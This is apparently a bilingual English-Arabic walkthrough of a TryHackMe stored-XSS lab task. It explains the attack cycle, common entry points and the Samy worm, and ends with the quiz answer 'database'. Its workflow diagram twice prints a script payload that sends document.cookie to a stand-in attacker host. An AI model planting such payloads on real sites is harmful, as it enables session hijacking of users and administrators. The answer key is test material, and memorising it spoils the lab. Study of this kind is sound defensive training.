# Task 04 · Stored XSS (البرمجة النصية المخزنة الدائمة عبر المواقع)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

**Stored Cross-Site Scripting (Stored XSS)**—also referred to as **Persistent XSS** or **Second-Order XSS**—is the most dangerous and damaging variant of cross-site scripting.

In a Stored XSS vulnerability, the malicious script injected by the attacker is permanently saved on the target application's server-side storage (most commonly in a backend **database**, but also potentially in server logs, cache files, or message queues).

### The Attack Cycle:
1. **The Injection Phase:** The attacker submits the payload through an ordinary application feature designed to accept persistent user content (e.g., commenting on a blog post, editing user bio in profile settings, submitting customer feedback, posting on a forum, or creating a support ticket).
2. **The Storage Phase:** The backend application writes the unsanitized payload into the persistent storage engine (e.g., MySQL `INSERT INTO comments VALUES (...)`).
3. **The Execution Phase (Victim Trigger):** Whenever any legitimate user (or administrator) visits that page, the server fetches the stored comment from the database and inserts it into the HTML response. The unsuspecting victim's browser parses the HTML, encounters the attacker's script, and executes it automatically.

### High-Value Injection Entry Points:
- Comment fields on blogs, articles, and products.
- User profile fields (Display name, bio, email, address, status message).
- Internal helpdesk / support ticketing systems.
- Product reviews and rating descriptions.
- Form inputs manipulated by intercepting proxies (tampering with hidden inputs, dropdown selections, or radio buttons).

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Mass Compromise / Worm Potential (Samy Worm):**
   - Stored XSS possesses an explosive propagation capability. In 2005, the famous *Samy Kamkar MySpace Worm* leveraged a Stored XSS vulnerability in profile descriptions to force every visiting user to add Samy as a friend and copy the payload into their own profile. Within 20 hours, over one million users were infected!
2. **Persistence & Delayed Trigger:**
   - The attacker does not need to be active when the victim is compromised. The trap remains live on the server indefinitely until the record is deleted or updated.
   - Privilege Escalation: If a normal user injects a payload into an internal support ticket, and a high-privilege site administrator opens that ticket in their administrative dashboard, the attacker compromises an admin session without direct access to the admin portal.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** Where does a web application permanently save user-generated records, forum posts, profile details, and comments so that they can be retrieved later? (An 8-letter singular noun starting with D: d_______).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Architectural Stored XSS Workflow:

```
[ Attacker ]
Submits Form: <script>fetch('http://evil.thm/steal?c='+document.cookie)</script>
     │
     ▼
[ Web Server Backend ]
Executes: INSERT INTO comments (text) VALUES ('<script>...</script>')
     │
     ▼
[ Relational / NoSQL Database ] ◄── Malicious script permanently stored on disk!
     │
     │ Later in time...
     │
[ Innocent Administrator / Regular User ]
Requests: GET /view_comments.php?post_id=42
     │
     ▼
[ Web Server ]
Fetches raw comment text from DB and concatenates into HTML response:
<div>User Comment: <script>fetch('http://evil.thm/steal?c='+document.cookie)</script></div>
     │
     ▼
[ Victim Browser ]
Parses HTML -> Executes <script> in trusted context -> Session compromised!
```

### 2. Analysis of Question 1:
- *Question:* How are stored XSS payloads usually stored on a website?
- *Explanation:* Modern dynamic web applications rely on relational databases (MySQL, PostgreSQL) or NoSQL databases (MongoDB) to persist user comments, profiles, and transactions. Unless the application sanitizes or encodes input before saving to the database, or safely HTML-encodes data upon rendering, the malicious payload lives in the **database**.
- *Answer:* `database`

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *How are stored XSS payloads usually stored on a website?*
  - **Answer:** `database`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Answer `database` validated on the TryHackMe platform.
- Demonstrated parity with OWASP Top 10 (WSTG-INPV-02: Testing for Stored Cross Site Scripting).

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** الـ Stored XSS هو أشد أنواع XSS فتكاً وخطورة؛ لأن الحمولة الخبيثة تُحفظ في قاعدة البيانات (`database`) بشكل دائم. أي مستخدم يزور الصفحة المصابة—سواء كان مستخدماً عادياً أو مديراً تنفيذياً—سيتم تنفيذ الكود الخبيث في متصفحه فوراً وبشكل تلقائي دون الحاجة لأي تفاعل اجتماعي أو الضغط على روابط مشبوهة (Zero-Click Execution).
